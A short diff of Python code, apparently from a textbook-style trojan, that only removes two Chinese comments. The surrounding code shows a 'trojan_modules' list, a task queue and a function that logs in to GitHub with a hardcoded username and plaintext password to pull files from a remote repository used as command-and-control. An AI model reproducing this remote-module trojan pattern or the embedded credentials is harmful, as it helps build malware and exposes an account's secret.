@@ -20,7 +20,7 @@ trojan_modules = []
 configured = False
 task_queue = Queue.Queue()
 
-# 通过账号密码连接到github，获取repo和branch
+
 def connect_to_github():
     gh = login(username="itesfites", password="479111Aa")
     repo = gh.repository("itesfites", "chapter7")
@@ -28,7 +28,7 @@ def connect_to_github():
 
     return gh,repo,branch
 
-# 从远程仓库中获取文件
+
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
